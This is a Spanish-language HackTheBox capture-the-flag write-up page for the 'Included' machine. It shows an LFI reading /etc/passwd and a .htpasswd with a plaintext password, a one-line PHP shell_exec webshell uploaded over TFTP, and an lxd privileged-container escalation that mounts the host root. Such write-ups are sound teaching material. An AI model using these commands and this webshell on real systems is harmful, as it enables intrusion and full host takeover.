@@ -1,0 +1,564 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <meta http-equiv="Content-Security-Policy" content="default-src 'self'; style-src 'self' 'unsafe-inline' https://fonts.googleapis.com; font-src https://fonts.gstatic.com; script-src 'self' 'unsafe-inline'; img-src 'self' data:; connect-src 'self'; base-uri 'self'; form-action 'none'; object-src 'none'">
+  <meta name="referrer" content="strict-origin-when-cross-origin">
+  <title>Included — HackTheBox Writeup | Brandeiks</title>
+  <link rel="icon" type="image/svg+xml" href="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%2064%2064'%3E%3Crect%20width='64'%20height='64'%20rx='13'%20fill='%2300ff88'/%3E%3Ctext%20x='32'%20y='34'%20text-anchor='middle'%20dominant-baseline='central'%20font-family='Arial%20Black,%20Arial,%20Helvetica,%20sans-serif'%20font-size='46'%20font-weight='900'%20fill='%23050a0e'%3EB%3C/text%3E%3C/svg%3E">
+  <link rel="apple-touch-icon" href="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%2064%2064'%3E%3Crect%20width='64'%20height='64'%20rx='13'%20fill='%2300ff88'/%3E%3Ctext%20x='32'%20y='34'%20text-anchor='middle'%20dominant-baseline='central'%20font-family='Arial%20Black,%20Arial,%20Helvetica,%20sans-serif'%20font-size='46'%20font-weight='900'%20fill='%23050a0e'%3EB%3C/text%3E%3C/svg%3E">
+  <meta name="description" content="Writeup de la máquina Included de HackTheBox (Linux, Muy Fácil): un LFI en /?file= filtra el .htpasswd del sitio, un webshell subido por TFTP se ejecuta a través del propio LFI, y el grupo lxd de mike da un contenedor privilegiado con el host montado.">
+  <meta name="author" content="Brandon Zevallos Pastrana">
+  <link rel="canonical" href="https://brandeiks.github.io/writeups/hackthebox/muy-facil/included.html">
+  <meta property="og:type" content="article">
+  <meta property="og:site_name" content="Brandeiks">
+  <meta property="og:title" content="Included — HackTheBox Writeup | Brandeiks">
+  <meta property="og:description" content="Writeup de la máquina Included de HackTheBox (Linux, Muy Fácil): un LFI en /?file= filtra el .htpasswd del sitio, un webshell subido por TFTP se ejecuta a través del propio LFI, y el grupo lxd de mike da un contenedor privilegiado con el host montado.">
+  <meta property="og:url" content="https://brandeiks.github.io/writeups/hackthebox/muy-facil/included.html">
+  <meta property="og:image" content="https://brandeiks.github.io/assets/og/included.png">
+  <meta property="og:image:width" content="1200">
+  <meta property="og:image:height" content="630">
+  <meta property="og:locale" content="es_ES">
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:title" content="Included — HackTheBox Writeup | Brandeiks">
+  <meta name="twitter:description" content="Writeup de la máquina Included de HackTheBox (Linux, Muy Fácil): un LFI en /?file= filtra el .htpasswd del sitio, un webshell subido por TFTP se ejecuta a través del propio LFI, y el grupo lxd de mike da un contenedor privilegiado con el host montado.">
+  <meta name="twitter:image" content="https://brandeiks.github.io/assets/og/included.png">
+  <script type="application/ld+json">{"@context": "https://schema.org", "@type": "TechArticle", "headline": "Included — HackTheBox Writeup | Brandeiks", "description": "Writeup de la máquina Included de HackTheBox (Linux, Muy Fácil): un LFI en /?file= filtra el .htpasswd del sitio, un webshell subido por TFTP se ejecuta a través del propio LFI, y el grupo lxd de mike da un contenedor privilegiado con el host montado.", "inLanguage": "es", "url": "https://brandeiks.github.io/writeups/hackthebox/muy-facil/included.html", "image": "https://brandeiks.github.io/assets/og/included.png", "author": {"@type": "Person", "name": "Brandon Zevallos Pastrana", "url": "https://brandeiks.github.io/"}, "publisher": {"@type": "Organization", "name": "Brandeiks", "url": "https://brandeiks.github.io/"}, "mainEntityOfPage": {"@type": "WebPage", "@id": "https://brandeiks.github.io/writeups/hackthebox/muy-facil/included.html"}}</script>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link rel="stylesheet" href="../../../assets/writeups.css">
+  <link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Rajdhani:wght@300;400;600;700&family=Orbitron:wght@400;900&display=swap" rel="stylesheet"/>
+  <style>
+    /* FOOTER */
+
+    @media (max-width: 1024px) {
+      .writeup-layout { grid-template-columns: 1fr; }
+      .sidebar { position: static; order: -1; display: flex; gap: 1rem; flex-wrap: wrap; }
+      .sidebar-box { flex: 1; min-width: 200px; margin-bottom: 0; }
+    }
+    @media (max-width: 768px) {
+      nav { padding: 1rem 1.5rem; }
+      .writeup-hero { padding: 6rem 1.5rem 2.5rem; }
+      .writeup-layout { padding: 2rem 1.5rem; }
+      .cmd-ref-grid { grid-template-columns: 1fr; }
+      body, a, button { cursor: auto; }
+      .cursor, .cursor-ring { display: none; }
+    }
+
+        /* NAV RESPONSIVE */
+    @media (max-width: 900px) {
+      nav { padding: 0.7rem 1rem; }
+      .nav-logo { font-size: 0.85rem; letter-spacing: 2px; }
+      .nav-back { font-size: 0.68rem; margin-left: 0.8rem; }
+    }
+    @media (max-width: 700px) {
+      nav { flex-wrap: wrap; justify-content: space-between; row-gap: 0; padding: 0.6rem 1rem; }
+      .nav-logo { font-size: 0.82rem; letter-spacing: 1px; }
+      .menu-btn {
+        display: flex; align-items: center; justify-content: center;
+        width: 40px; height: 34px; cursor: pointer;
+        border: 1px solid var(--dim); border-radius: 3px;
+      }
+      .menu-btn span, .menu-btn span::before, .menu-btn span::after {
+        display: block; width: 18px; height: 2px; background: var(--green);
+        transition: transform 0.25s, opacity 0.25s;
+      }
+      .menu-btn span { position: relative; }
+      .menu-btn span::before, .menu-btn span::after { content: ''; position: absolute; left: 0; }
+      .menu-btn span::before { top: -6px; }
+      .menu-btn span::after { top: 6px; }
+      .menu-check:checked ~ nav .menu-btn span { background: transparent; }
+      .menu-check:checked ~ nav .menu-btn span::before { transform: translateY(6px) rotate(45deg); }
+      .menu-check:checked ~ nav .menu-btn span::after { transform: translateY(-6px) rotate(-45deg); }
+      .nav-back { display: none; }
+      .menu-check:checked ~ nav .nav-back {
+        display: block; width: 100%; text-align: center;
+        margin: 0; padding: 0.7rem 0; font-size: 0.78rem;
+        border-top: 1px solid var(--dim);
+      }
+    }
+    @media (max-width: 480px) {
+      nav { padding: 0.55rem 0.8rem; }
+      .nav-logo { font-size: 0.76rem; }
+      .menu-check:checked ~ nav .nav-back { font-size: 0.72rem; padding: 0.6rem 0; }
+          footer { flex-direction: column; gap: 0.8rem; text-align: center; padding: 1.5rem; }
+}
+  </style>
+</head>
+<body>
+
+<a href="#main" class="skip-link">Saltar al contenido</a>
+<noscript><div class="aviso-noscript"><strong>JavaScript desactivado:</strong> la navegación entre writeups, el modo guion, el zoom de capturas y el progreso de lectura necesitan JavaScript. El contenido del writeup, los comandos y los enlaces del índice funcionan igualmente.</div></noscript>
+<div class="progress-container"><div class="progress-bar" id="readingProgress"></div></div>
+
+<!-- NAV -->
+<input type="checkbox" id="menuAbierto" class="menu-check" aria-hidden="true">
+<nav>
+    <a href="../../../index.html" class="nav-logo">BRANDEIKS_SEC</a>
+    <label for="menuAbierto" class="menu-btn" aria-label="Abrir menú"><span></span></label>
+    <a href="../../../index.html" class="nav-back">INICIO</a>
+    <a href="../../../videos/index.html" class="nav-back">VÍDEOS</a>
+    <a href="../../../writeups/index.html" class="nav-back">WRITEUPS</a>
+    <a href="../../../herramientas/index.html" class="nav-back">HERRAMIENTAS</a>
+    <a href="../../../certificaciones.html" class="nav-back">CERTIFICACIONES</a>
+  </nav>
+
+<!-- HERO -->
+<div class="writeup-hero">
+  <div class="hero-grid"></div>
+  <div class="hero-glow"></div>
+  <div class="writeup-hero-content">
+    <div class="breadcrumb">
+      <a href="../../../index.html">brandeiks</a> /
+      <a href="../../../writeups/index.html">writeups</a> /
+      <a href="../../../writeups/index.html">hackthebox</a> /
+      <span>included</span>
+    </div>
+    <h1 class="writeup-title">INCLU<span>DED</span></h1>
+    <p class="writeup-subtitle">// LFI filtra .htpasswd → webshell por TFTP → mike en el grupo lxd → contenedor privilegiado → root</p>
+    <div class="writeup-meta">
+      <span class="meta-badge badge-muy-facil">● MUY FÁCIL</span>
+      <span class="meta-badge badge-htb">HACKTHEBOX</span>
+      <span class="meta-badge badge-linux">LINUX</span>
+      <span class="meta-badge badge-web">LFI</span>
+      <span class="meta-badge badge-docker">LXD</span>
+      <span class="meta-date">📅 Octubre 2026 · Por Brandeiks</span>
+    </div>
+  </div>
+</div>
+
+<!-- LAYOUT -->
+<div class="writeup-layout">
+
+  <!-- SIDEBAR -->
+  <aside class="sidebar">
+    <div class="sidebar-box">
+      <p class="sidebar-title">// ÍNDICE</p>
+      <ul class="toc-list">
+        <li><a href="#recon">01 · Reconocimiento</a></li>
+        <li><a href="#lfi">02 · LFI y credenciales</a></li>
+        <li><a href="#webshell">03 · Webshell por TFTP</a></li>
+        <li><a href="#escalada">04 · Escalada: grupo lxd</a></li>
+        <li><a href="#cmdref">05 · Referencia Comandos</a></li>
+        <li><a href="#glosario">06 · Glosario</a></li>
+      </ul>
+    </div>
+
+    <div class="sidebar-box">
+      <p class="sidebar-title">// INFO MÁQUINA</p>
+      <div class="info-row"><span class="info-label">NOMBRE</span><span class="info-val val-cyan">Included</span></div>
+      <div class="info-row"><span class="info-label">SISTEMA</span><span class="info-val val-cyan">Linux (Ubuntu)</span></div>
+      <div class="info-row"><span class="info-label">DIFICULTAD</span><span class="info-val val-muy-facil">Muy Fácil</span></div>
+      <div class="info-row"><span class="info-label">PLATAFORMA</span><span class="info-val val-yellow">HackTheBox</span></div>
+      <div class="info-row"><span class="info-label">SERVICIO</span><span class="info-val val-yellow">Apache 2.4.29 + TFTP</span></div>
+    </div>
+
+    <div class="sidebar-box">
+      <p class="sidebar-title">// RUTA DE ATAQUE</p>
+      <div class="attack-path">
+        <div class="ap-item"><div class="ap-dot"></div><div class="ap-text"><span>/?file=</span> → LFI</div></div>
+        <div class="ap-line"></div>
+        <div class="ap-item"><div class="ap-dot"></div><div class="ap-text">.htpasswd → <span>mike:Sheffield19</span></div></div>
+        <div class="ap-line"></div>
+        <div class="ap-item"><div class="ap-dot"></div><div class="ap-text">TFTP <span>put</span> shell.php</div></div>
+        <div class="ap-line"></div>
+        <div class="ap-item"><div class="ap-dot"></div><div class="ap-text">LFI ejecuta el PHP → <span>www-data</span></div></div>
+        <div class="ap-line"></div>
+        <div class="ap-item"><div class="ap-dot"></div><div class="ap-text"><span>su mike</span> (grupo lxd)</div></div>
+        <div class="ap-line"></div>
+        <div class="ap-item"><div class="ap-dot"></div><div class="ap-text">contenedor <span>privileged=true</span> con / montado</div></div>
+        <div class="ap-line"></div>
+        <div class="ap-item"><div class="ap-dot"></div><div class="ap-text"><span>root.txt</span></div></div>
+      </div>
+    </div>
+  </aside>
+
+  <!-- MAIN CONTENT -->
+  <main id="main" class="writeup-content">
+    <!-- ===================== 01 RECONOCIMIENTO ===================== -->
+    <div class="section" id="recon">
+      <p class="section-label">// 01</p>
+      <h2 class="section-title">Reconocimiento</h2>
+      <div class="section-line"></div>
+
+      <div class="step-marker">
+        <div class="step-num">1</div>
+        <span class="step-title">ESCANEO TCP Y UDP</span>
+      </div>
+      <div class="cmd-block" data-cmd="sudo nmap -sT -sV -p22,80 10.129.95.185; sudo nmap -sU -p69 10.129.95.185">
+        <button class="copy-btn" onclick="copyCmd(this)">COPIAR</button>
+        <span class="cmd-label">BASH</span>
+        <div><span class="prompt">$ </span><span class="cmd">sudo nmap <span class="flag">-sT -sV -p</span><span class="arg">22,80</span> <span class="arg">10.129.95.185</span></span></div>
+        <div><span class="prompt">$ </span><span class="cmd">sudo nmap <span class="flag">-sU -p</span><span class="arg">69</span> <span class="arg">10.129.95.185</span></span></div>
+      </div>
+      <div class="output-block">
+        <div>22/tcp closed ssh</div>
+        <div><span class="o-green">80/tcp open   http  Apache httpd 2.4.29 (Ubuntu)</span></div>
+        <div><span class="o-green">69/udp open|filtered tftp</span></div>
+      </div>
+      <div class="info-box">
+        <p class="info-box-title">// NOTA</p>
+        <p>
+          Un <strong>TFTP sin autenticación</strong> junto a una web con parámetros sospechosos es casi siempre la misma
+          historia: algo se puede <strong>escribir</strong> por TFTP y algo lo <strong>incluye</strong> por HTTP.
+        </p>
+      </div>
+    </div>
+
+    <!-- ===================== 02 LFI Y CREDENCIALES ===================== -->
+    <div class="section" id="lfi">
+      <p class="section-label">// 02</p>
+      <h2 class="section-title">LFI y credenciales</h2>
+      <div class="section-line"></div>
+
+      <div class="step-marker">
+        <div class="step-num">2</div>
+        <span class="step-title">CONFIRMAR EL LFI</span>
+      </div>
+      <div class="cmd-block" data-cmd="curl -s 'http://10.129.95.185/?file=../../../etc/passwd' | head -5; curl -s 'http://10.129.95.185/?file=../../../var/www/html/.htpasswd'">
+        <button class="copy-btn" onclick="copyCmd(this)">COPIAR</button>
+        <span class="cmd-label">CURL</span>
+        <div><span class="prompt">$ </span><span class="cmd">curl <span class="flag">-s</span> <span class="arg">'http://10.129.95.185/?file=../../../etc/passwd'</span></span></div>
+        <div><span class="prompt">$ </span><span class="cmd">curl <span class="flag">-s</span> <span class="arg">'http://10.129.95.185/?file=../../../var/www/html/.htpasswd'</span></span></div>
+      </div>
+      <div class="output-block">
+        <div>root:x:0:0:root:/root:/bin/bash</div>
+        <div>daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin</div>
+        <div><span class="comment">[…]</span></div>
+        <div><span class="o-green">mike:Sheffield19</span></div>
+      </div>
+      <div class="vuln-box">
+        <p class="vuln-box-title">// LOCAL FILE INCLUSION</p>
+        <p>
+          <strong>Dónde:</strong> parámetro <code>file</code> de la portada, sin filtrar secuencias <code>../</code>.<br>
+          <strong>Qué permite:</strong> leer cualquier archivo legible por Apache. Lo más valioso no es <code>/etc/passwd</code>
+          sino el propio <code>.htpasswd</code> del sitio, con una credencial en texto plano: <code>mike:Sheffield19</code>.
+        </p>
+      </div>
+    </div>
+
+    <!-- ===================== 03 WEBSHELL POR TFTP ===================== -->
+    <div class="section" id="webshell">
+      <p class="section-label">// 03</p>
+      <h2 class="section-title">Webshell por TFTP</h2>
+      <div class="section-line"></div>
+
+      <div class="step-marker">
+        <div class="step-num">3</div>
+        <span class="step-title">SUBIR UN PHP AL DIRECTORIO DE TFTP</span>
+      </div>
+      <div class="prose">
+        <p>
+          TFTP no pide ninguna autenticación. Si su directorio (<code>/var/lib/tftpboot</code>) es alcanzable por el LFI,
+          cualquier archivo que se suba ahí se puede incluir — y si es PHP, Apache lo ejecuta.
+        </p>
+      </div>
+      <div class="cmd-block" data-cmd="printf '&lt;?php echo shell_exec($_GET[&quot;c&quot;]); ?&gt;' > shell_inc.php; curl -s -T shell_inc.php 'tftp://10.129.95.185/shell.php'">
+        <button class="copy-btn" onclick="copyCmd(this)">COPIAR</button>
+        <span class="cmd-label">TFTP</span>
+        <div><span class="prompt">$ </span><span class="cmd">printf <span class="arg">'&lt;?php echo shell_exec($_GET["c"]); ?&gt;'</span> &gt; <span class="arg">shell_inc.php</span></span></div>
+        <div><span class="prompt">$ </span><span class="cmd">curl <span class="flag">-s -T</span> <span class="arg">shell_inc.php</span> <span class="arg">'tftp://10.129.95.185/shell.php'</span></span></div>
+      </div>
+      <div class="warn-box">
+        <p class="warn-box-title">// OJO</p>
+        <p>
+          El cliente <code>tftp IP -c "put …"</code> del paquete hpa <strong>no acepta</strong> esa sintaxis y falla con
+          <em>invalid command</em>. <code>curl -T archivo tftp://IP/nombre</code> funciona a la primera.
+        </p>
+      </div>
+
+      <div class="step-marker">
+        <div class="step-num">4</div>
+        <span class="step-title">EJECUTAR EL WEBSHELL VÍA LFI</span>
+      </div>
+      <div class="cmd-block" data-cmd="curl -s -G 'http://10.129.95.185/' --data-urlencode 'file=../../../var/lib/tftpboot/shell.php' --data-urlencode 'c=id'">
+        <button class="copy-btn" onclick="copyCmd(this)">COPIAR</button>
+        <span class="cmd-label">RCE</span>
+        <div><span class="prompt">$ </span><span class="cmd">curl <span class="flag">-s -G</span> <span class="arg">'http://10.129.95.185/'</span> \</span></div>
+        <div><span class="cmd">  --data-urlencode <span class="arg">'file=../../../var/lib/tftpboot/shell.php'</span> \</span></div>
+        <div><span class="cmd">  --data-urlencode <span class="arg">'c=id'</span></span></div>
+      </div>
+      <div class="output-block">
+        <div><span class="o-green">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span></div>
+      </div>
+      <div class="info-box">
+        <p class="info-box-title">// RCE NO INTERACTIVA</p>
+        <p>
+          No hace falta una reverse shell: el LFI ya ejecuta el PHP subido y devuelve su salida directamente en la respuesta
+          HTTP. Es más rápido para encadenar comandos como éste.
+        </p>
+      </div>
+
+      <div class="step-marker">
+        <div class="step-num">5</div>
+        <span class="step-title">PASAR A MIKE Y LEER LA FLAG DE USUARIO</span>
+      </div>
+      <div class="cmd-block" data-cmd="curl -s -G 'http://10.129.95.185/' --data-urlencode 'file=../../../var/lib/tftpboot/shell.php' --data-urlencode 'c=(sleep 1; echo Sheffield19) | script -qec &quot;su mike -c id&quot; /dev/null'">
+        <button class="copy-btn" onclick="copyCmd(this)">COPIAR</button>
+        <span class="cmd-label">SU</span>
+        <div><span class="prompt">$ </span><span class="cmd">curl <span class="flag">-s -G</span> <span class="arg">'http://10.129.95.185/'</span> \</span></div>
+        <div><span class="cmd">  --data-urlencode <span class="arg">'file=../../../var/lib/tftpboot/shell.php'</span> \</span></div>
+        <div><span class="cmd">  --data-urlencode <span class="arg">'c=(sleep 1; echo Sheffield19) | script -qec "su mike -c id" /dev/null'</span></span></div>
+      </div>
+      <div class="output-block">
+        <div><span class="o-green">uid=1000(mike) gid=1000(mike) groups=1000(mike),108(lxd)</span></div>
+        <div></div>
+        <div><span class="o-cyan">[flag oculta]</span>  <span class="comment"># user.txt</span></div>
+      </div>
+      <div class="info-box">
+        <p class="info-box-title">// NOTA</p>
+        <p>
+          <code>su</code> sin un terminal rechaza la contraseña (<em>Authentication failure</em>). El truco es envolverlo en
+          <code>script -qec "..." /dev/null</code> (le da un pseudo-terminal) y meter un <code>sleep 1</code> antes de la
+          contraseña, para que no se consuma antes de que aparezca el prompt.
+        </p>
+      </div>
+    </div>
+
+    <!-- ===================== 04 ESCALADA: GRUPO LXD ===================== -->
+    <div class="section" id="escalada">
+      <p class="section-label">// 04</p>
+      <h2 class="section-title">Escalada: grupo lxd</h2>
+      <div class="section-line"></div>
+
+      <div class="vuln-box">
+        <p class="vuln-box-title">// MIKE PERTENECE AL GRUPO LXD</p>
+        <p>
+          Pertenecer al grupo <code>lxd</code> equivale a <strong>root</strong>: ese grupo puede crear contenedores
+          <strong>privilegiados</strong> y montar el sistema de archivos del host dentro de ellos.
+        </p>
+      </div>
+
+      <div class="step-marker">
+        <div class="step-num">6</div>
+        <span class="step-title">CONSTRUIR UNA IMAGEN COMPATIBLE CON LXD 3.0.3</span>
+      </div>
+      <div class="prose">
+        <p>
+          La máquina no tiene salida a Internet real y su LXD es la versión <strong>3.0.3</strong>, que espera el formato
+          clásico (<code>metadata.yaml</code> + rootfs). Las imágenes actuales del catálogo vienen en formato Incus y
+          no traen ese fichero, así que hay que fabricar una propia a partir de un rootfs de Alpine.
+        </p>
+      </div>
+      <div class="cmd-block" data-cmd="sudo tee /tmp/lxdmeta/metadata.yaml <<'YAML'
+architecture: &quot;x86_64&quot;
+creation_date: 1600000000
+properties:
+  os: &quot;alpine&quot;
+YAML
+sudo tar -C /tmp/lxdmeta -cJf /tmp/metaL.tar.xz metadata.yaml
+printf '#!/bin/sh\nwhile true; do sleep 60; done\n' | sudo tee /tmp/rootfs_dir/sbin/init
+sudo tar -C /tmp/rootfs_dir -cJf /tmp/rootfsM.tar.xz .">
+        <button class="copy-btn" onclick="copyCmd(this)">COPIAR</button>
+        <span class="cmd-label">LXD IMAGE</span>
+        <div><span class="comment"># metadata.yaml propio (el catálogo actual no lo trae)</span></div>
+        <div><span class="cmd">sudo tar -C /tmp/lxdmeta -cJf /tmp/metaL.tar.xz metadata.yaml</span></div>
+        <div><span class="comment"># /sbin/init que mantiene el contenedor vivo (el rootfs Alpine no arranca solo)</span></div>
+        <div><span class="cmd">printf '#!/bin/sh\nwhile true; do sleep 60; done\n' | sudo tee /tmp/rootfs_dir/sbin/init</span></div>
+        <div><span class="cmd">sudo tar -C /tmp/rootfs_dir -cJf /tmp/rootfsM.tar.xz .</span></div>
+      </div>
+
+      <div class="step-marker">
+        <div class="step-num">7</div>
+        <span class="step-title">IMPORTAR, MONTAR EL HOST Y LEER ROOT.TXT</span>
+      </div>
+      <div class="cmd-block" data-cmd="lxc image import /tmp/metaL.tar.xz /tmp/rootfsM.tar.xz --alias alpineimg; lxc init alpineimg ignite -c security.privileged=true; lxc config device add ignite mydev disk source=/ path=/mnt/root recursive=true; lxc start ignite; lxc exec ignite -- cat /mnt/root/root/root.txt">
+        <button class="copy-btn" onclick="copyCmd(this)">COPIAR</button>
+        <span class="cmd-label">LXC</span>
+        <div><span class="prompt">mike@included:~$ </span><span class="cmd">lxc image import /tmp/metaL.tar.xz /tmp/rootfsM.tar.xz <span class="flag">--alias</span> <span class="arg">alpineimg</span></span></div>
+        <div><span class="prompt">mike@included:~$ </span><span class="cmd">lxc init alpineimg ignite <span class="flag">-c</span> <span class="arg">security.privileged=true</span></span></div>
+        <div><span class="prompt">mike@included:~$ </span><span class="cmd">lxc config device add ignite mydev disk <span class="arg">source=/ path=/mnt/root recursive=true</span></span></div>
+        <div><span class="prompt">mike@included:~$ </span><span class="cmd">lxc start ignite</span></div>
+        <div><span class="prompt">mike@included:~$ </span><span class="cmd">lxc exec ignite -- cat /mnt/root/root/root.txt</span></div>
+      </div>
+      <div class="output-block">
+        <div><span class="o-green">[flag oculta]</span></div>
+      </div>
+      <div class="info-box">
+        <p class="info-box-title">// FLAGS</p>
+        <p>
+          <strong>user:</strong> [flag oculta] · <strong>root:</strong> [flag oculta].
+          Ruta completa: LFI → <code>.htpasswd</code> → TFTP + LFI → webshell → <code>su mike</code> → grupo
+          <code>lxd</code> → contenedor privilegiado con <code>/</code> montado. Tiempo total: ~45 minutos (la mayor parte,
+          fabricar la imagen LXD compatible).
+        </p>
+      </div>
+    </div>
+
+    <!-- ===================== 05 CMD REF ===================== -->
+    <div class="section" id="cmdref">
+      <p class="section-label">// 05</p>
+      <h2 class="section-title">Referencia Comandos</h2>
+      <div class="section-line"></div>
+
+      <div class="cmd-ref-grid">
+
+        <div class="cmd-ref-card">
+          <div class="cmd-ref-name">curl -T tftp://</div>
+          <div class="cmd-ref-syntax">curl -T archivo tftp://IP/nombre</div>
+          <div class="cmd-ref-desc">Sube un fichero por TFTP; más fiable que el cliente <code>tftp</code> clásico para un <code>put</code> simple.</div>
+        </div>
+
+        <div class="cmd-ref-card">
+          <div class="cmd-ref-name">curl --data-urlencode</div>
+          <div class="cmd-ref-syntax">curl -s -G URL --data-urlencode 'file=ruta' --data-urlencode 'c=comando'</div>
+          <div class="cmd-ref-desc">Arma una petición GET con varios parámetros codificados correctamente, usada aquí para disparar el LFI y el comando del webshell.</div>
+        </div>
+
+        <div class="cmd-ref-card">
+          <div class="cmd-ref-name">script (pseudo-TTY)</div>
+          <div class="cmd-ref-syntax">(sleep 1; echo PASS) | script -qec "comando" /dev/null</div>
+          <div class="cmd-ref-desc">Da un pseudo-terminal a un comando no interactivo, necesario para que <code>su</code> acepte la contraseña por una tubería.</div>
+        </div>
+
+        <div class="cmd-ref-card">
+          <div class="cmd-ref-name">lxc image import</div>
+          <div class="cmd-ref-syntax">lxc image import metadata.tar.xz rootfs.tar.xz --alias nombre</div>
+          <div class="cmd-ref-desc">Registra una imagen local de contenedor a partir de sus dos partes (metadatos + sistema de archivos).</div>
+        </div>
+
+        <div class="cmd-ref-card">
+          <div class="cmd-ref-name">lxc init / config device add</div>
+          <div class="cmd-ref-syntax">lxc init imagen nombre -c security.privileged=true<br>lxc config device add nombre dev disk source=/ path=/mnt/root recursive=true</div>
+          <div class="cmd-ref-desc">Crea un contenedor sin aislamiento de usuario (<code>privileged</code>) y le monta el disco raíz del host dentro.</div>
+        </div>
+
+      </div>
+    </div>
+
+    <!-- ===================== 06 GLOSARIO ===================== -->
+    <div class="section" id="glosario">
+      <p class="section-label">// 06</p>
+      <h2 class="section-title">Glosario</h2>
+      <div class="section-line"></div>
+
+      <div class="glosario-grid">
+
+        <div class="glos-card">
+          <div class="glos-term">LFI — Local File Inclusion</div>
+          <div class="glos-def">
+            Vulnerabilidad donde una aplicación incluye y a veces ejecuta un archivo cuyo nombre controla el usuario, sin
+            validar la ruta. Permite leer ficheros del servidor y, si puede apuntar a algo que el usuario subió, ejecutar código.
+          </div>
+        </div>
+
+        <div class="glos-card">
+          <div class="glos-term">TFTP</div>
+          <div class="glos-def">
+            Protocolo de transferencia de ficheros muy simple, sobre UDP y <strong>sin autenticación</strong>. Si su
+            directorio es accesible desde otro servicio, cualquiera puede escribir ahí.
+          </div>
+        </div>
+
+        <div class="glos-card">
+          <div class="glos-term">Grupo lxd</div>
+          <div class="glos-def">
+            Pertenecer a este grupo en Linux equivale a <strong>root</strong>: permite crear contenedores privilegiados
+            con el sistema de archivos del host montado dentro, sin necesitar <code>sudo</code>.
+          </div>
+        </div>
+
+        <div class="glos-card">
+          <div class="glos-term">Contenedor privilegiado</div>
+          <div class="glos-def">
+            Contenedor que comparte el espacio de IDs de usuario con el host (<code>security.privileged=true</code>): el
+            <code>root</code> dentro del contenedor es el mismo <code>root</code> del host.
+          </div>
+        </div>
+
+        <div class="glos-card">
+          <div class="glos-term">.htpasswd</div>
+          <div class="glos-def">
+            Fichero de credenciales de Apache para autenticación básica. Si queda dentro del webroot y hay un LFI, se
+            convierte en una filtración directa de usuarios y contraseñas.
+          </div>
+        </div>
+
+        <div class="glos-card">
+          <div class="glos-term">metadata.yaml (imagen LXD)</div>
+          <div class="glos-def">
+            Fichero que describe una imagen de contenedor clásica (arquitectura, fecha, sistema operativo). Versiones
+            antiguas de LXD lo exigen; los formatos de imagen más nuevos (Incus) no lo incluyen.
+          </div>
+        </div>
+
+      </div>
+    </div>
+  <div class="writeup-nav" aria-label="Navegación entre writeups"><a class="anterior" href="ignition.html"><span class="dir">← ANTERIOR</span><span class="nombre">Ignition</span></a><a class="siguiente" href="oopsie.html"><span class="dir">SIGUIENTE →</span><span class="nombre">Oopsie</span></a></div>
+<section class="relacionados"><h2>// RELACIONADOS POR ETIQUETAS</h2><div class="rel-grid"><a class="rel-card" href="../facil/goodgames.html"><span class="nombre">GoodGames</span><span class="meta">hackthebox · facil · Docker · Escape</span></a><a class="rel-card" href="oopsie.html"><span class="nombre">Oopsie</span><span class="meta">hackthebox · muy-facil · Web · SUID</span></a></div></section>
+</main>
+</div>
+
+<!-- FOOTER -->
+<footer>
+    <p>© 2026 <span>Brandon Zevallos Pastrana</span> — Writeup de Included · HackTheBox</p>
+    <p>Hecho con <span>kali linux</span> &amp; <span>❤</span></p>
+  </footer>
+
+<script>
+  // ACTIVE TOC
+  const sections = document.querySelectorAll('.section[id]');
+  const tocLinks = document.querySelectorAll('.toc-list a');
+  const tocObserver = new IntersectionObserver(entries => {
+    entries.forEach(e => {
+      if (e.isIntersecting) {
+        tocLinks.forEach(a => a.classList.remove('active'));
+        const active = document.querySelector(`.toc-list a[href="#${e.target.id}"]`);
+        if (active) active.classList.add('active');
+      }
+    });
+  }, { rootMargin: '-30% 0px -60% 0px' });
+  sections.forEach(s => tocObserver.observe(s));
+
+
+  // SCROLL REVEAL
+  const obs = new IntersectionObserver(entries => {
+    entries.forEach(e => { if (e.isIntersecting) e.target.classList.add('visible'); });
+  }, { threshold: 0.06 });
+  document.querySelectorAll('.section').forEach(s => obs.observe(s));
+
+  // PROGRESS BAR
+  window.addEventListener('scroll', () => {
+    const winScroll = document.documentElement.scrollTop;
+    const height = document.documentElement.scrollHeight - window.innerHeight;
+    const scrolled = height > 0 ? (winScroll / height) * 100 : 0;
+    const bar = document.getElementById('readingProgress');
+    if (bar) bar.style.width = scrolled + '%';
+  });
+
+  // TOAST
+  function showToast(msg) {
+    let toast = document.querySelector('.toast');
+    if (!toast) {
+      toast = document.createElement('div');
+      toast.className = 'toast';
+      document.body.appendChild(toast);
+    }
+    toast.textContent = '📋 ' + msg;
+    toast.classList.add('show');
+    setTimeout(() => toast.classList.remove('show'), 2000);
+  }
+
+  // COPY COMMAND
+  function copyCmd(btn) {
+    const block = btn.closest('.cmd-block');
+    const cmd = block.dataset.cmd || '';
+    navigator.clipboard.writeText(cmd).then(() => {
+      btn.textContent = '✓ OK';
+      btn.classList.add('copied');
+      showToast('Comando copiado ✓');
+      setTimeout(() => {
+        btn.textContent = 'COPY';
+        btn.classList.remove('copied');
+      }, 1800);
+    }).catch(() => {
+      showToast('Error al copiar');
+    });
+  }
+</script>
+<script id="datos-writeup" type="application/json">{"nombre": "INCLUDED", "plataforma": "hackthebox", "dificultad": "muy-facil", "url": "https://brandeiks.github.io/writeups/hackthebox/muy-facil/included.html"}</script>
+<script src="../../../assets/cursor.js" defer></script>
+<script src="../../../assets/writeup.js" defer></script>
+</body>
+</html>
